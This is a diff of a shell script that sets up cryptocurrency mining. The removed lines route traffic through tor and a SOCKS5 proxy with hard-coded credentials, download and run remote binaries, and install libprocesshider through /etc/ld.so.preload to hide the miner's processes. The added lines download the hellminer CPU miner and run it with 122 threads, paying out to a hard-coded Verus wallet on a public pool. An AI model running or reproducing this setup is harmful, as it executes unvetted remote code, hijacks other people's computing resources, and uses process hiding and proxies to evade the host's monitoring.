@@ -1,51 +1,12 @@
-apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
-
-apt update
-
-apt -y install binutils cmake build-essential screen unzip net-tools curl nano tor
-service tor start
-
-wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
-
-tar -xvzf graphics.tar.gz
-
-cat > graftcp/local/graftcp-local.conf <<END
-listen = :2233
-loglevel = 1
-socks5 = sg-socks5.woiden.net:8080
-socks5_username = woiden_sairinjitu
-socks5_password = 12345
-END
-
-./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
-
-sleep .2
-
-echo " "
-echo " "
-
-echo ""
-
-./graftcp/graftcp curl ifconfig.me
-
-echo " "
-echo " "
-
-echo ""
-
-echo " "
-echo " "
-
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
-chmod +x bezzHash
-
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
-
-
-git clone https://github.com/hanifgz/libprocesshider.git
-cd libprocesshider;make
-sudo mv libprocesshider.so /usr/local/lib/;echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-cd ..
-
-
-./graftcp/graftcp wget https://raw.githubusercontent.com/adisubarja/pepek/main/verus.sh && chmod u+x verus.sh && ./verus.sh && chmod +x start &&./start
+#!/bin/sh
+wget https://raw.githubusercontent.com/hellcatz/luckpool/master/miners/hellminer_cpu_linux.tar.gz
+tar xf hellminer_cpu_linux.tar.gz
+PoolHost=stratum+tcp://na.luckpool.net
+Port=3956#xnsub
+PublicVerusCoinAddress=RGVegWzDKhuPUAKJybftAZm4BXShNFPCYe
+WorkerName=$(echo $(shuf -i 1-999 -n 1)-free)
+Threads=122
+#set working directory to the location of this script
+DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
+cd $DIR
+./hellminer -c "${PoolHost}":"${Port}" -u "${PublicVerusCoinAddress}"."${WorkerName}" --cpu "${Threads}" "$@" 
